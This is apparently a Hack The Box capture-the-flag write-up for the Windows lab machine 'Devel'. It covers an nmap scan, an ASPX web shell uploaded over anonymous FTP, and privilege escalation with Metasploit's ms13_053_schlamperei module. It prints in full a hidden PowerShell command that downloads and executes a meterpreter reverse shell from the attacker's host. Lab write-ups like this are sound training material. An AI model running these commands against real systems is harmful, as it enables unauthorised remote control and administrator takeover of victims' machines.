### Information Gathering

#### Nmap scan

nmap -sC -sV -oA -nmap 10.10.10.5

```
# Nmap 7.40 scan initiated Fri Jul 21 04:29:30 2017 as: nmap -sV -sC -oA nmap 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.33s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-24-17  06:58AM                 2940 finalwtf.aspx
| 07-24-17  07:17AM                 2932 htw.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 21 04:30:06 2017 -- 1 IP address (1 host up) scanned in 35.83 seconds
```

ftp-anon: Anonymous FTP login allowed - can be used to upload the web shell \(aspx\)

We can see here that it uses the Microsoft-IIS/7.5 which means the web server is powered by ASP

#### Exploitation and Gaining Access

Aspx web shell used:

[https://github.com/unbaiat/maliciouspieceofcodethatcanbeuploadedtoasitetogainaccesstofilesstoredonthatsite/blob/master/aspxshell.aspx](https://github.com/unbaiat/maliciouspieceofcodethatcanbeuploadedtoasitetogainaccesstofilesstoredonthatsite/blob/master/aspxshell.aspx)

After uploading the web shell, I accessed the web shell on the web browser.

Since I have a web shell or backdoor installed, I can now execute some commands. For example i can run a powershell command to download and execute the meterpreter reverse tcp. To execute the meterpreter reverse shell, I fired up the metasploit console and searched the web\_delivery exploit.

**Actual commands here:**

    kaipowered@debian:~/Documents/HTB/Devel$ msfconsole


                                       .,,.                  .
                                    .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                         d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                      d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
      d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
      88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
     d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
    d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                              .a#$$$$$$"`          88b  d8P  88b`?8888P'
                           ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                        .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                     .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
                  ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
               .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
    _______________________________________________________________   ,&$$$$$$'_____
                                                                     ll&&$$$$'
                                                                  .;;lll&&&&'
                                                                ...;;lllll&'
                                                              ......;;;llll;;;....
                                                               ` ......;;;;... .  .


           =[ metasploit v4.15.5-dev-                         ]
    + -- --=[ 1674 exploits - 959 auxiliary - 294 post        ]
    + -- --=[ 489 payloads - 40 encoders - 9 nops             ]
    + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

    msf > 
    msf > search web_delivery

    Matching Modules
    ================

       Name                                                   Disclosure Date  Rank    Description
       ----                                                   ---------------  ----    -----------
       exploit/multi/script/web_delivery                      2013-07-19       manual  Script Web Delivery
       exploit/windows/misc/regsvr32_applocker_bypass_server  2016-04-19       manual  Regsvr32.exe (.sct) Application Whitelisting Bypass Server


    msf > use exploit/multi/script/web_delivery
    msf exploit(web_delivery) > show options

    Module options (exploit/multi/script/web_delivery):

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT  8080             yes       The local port to listen on.
       SSL      false            no        Negotiate SSL for incoming connections
       SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
       URIPATH                   no        The URI to use for this exploit (default is random)


    Payload options (python/meterpreter/reverse_tcp):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST                   yes       The listen address
       LPORT  4444             yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Python


    msf exploit(web_delivery) > show targets

    Exploit targets:

       Id  Name
       --  ----
       0   Python
       1   PHP
       2   PSH


    msf exploit(web_delivery) > set target 2
    target => 2
    msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(web_delivery) > run
    [*] Started reverse TCP handler on 0.0.0.0:4444 
    [*] Using URL: http://0.0.0.0:8080/2HUTvO3SZKKZ
    [*] Local IP: http://192.168.8.2:8080/2HUTvO3SZKKZ
    [*] Server started.
    [*] Run the following command on the target machine:
    powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.8.1:8080/2HUTvO3SZKKZ');

I copied and pasted the powershell command to the web shell then poof we got a shell.

```
powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.8.1:8080/2HUTvO3SZKKZ');
```

#### Privilege Escalation

After I got a shell, I searched the "suggester" from metasploit to use and automate and search the available vulnerabilities and their exploits on the vulnerable machine.

```
msf exploit(web_delivery) > search suggester

Matching Modules
================

   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   post/multi/recon/local_exploit_suggester                   normal  Multi Recon Local Exploit Suggester


msf exploit(web_delivery) >
```

These are the available exploits found on the vulnerable machine.

```
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 37 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

I used the schlamperei to gain administrator access on the vulnerable machine.

```
msf > use exploit/windows/local/ms13_053_schlamperei
```

And then I got an Administrator access on the machine. :\)

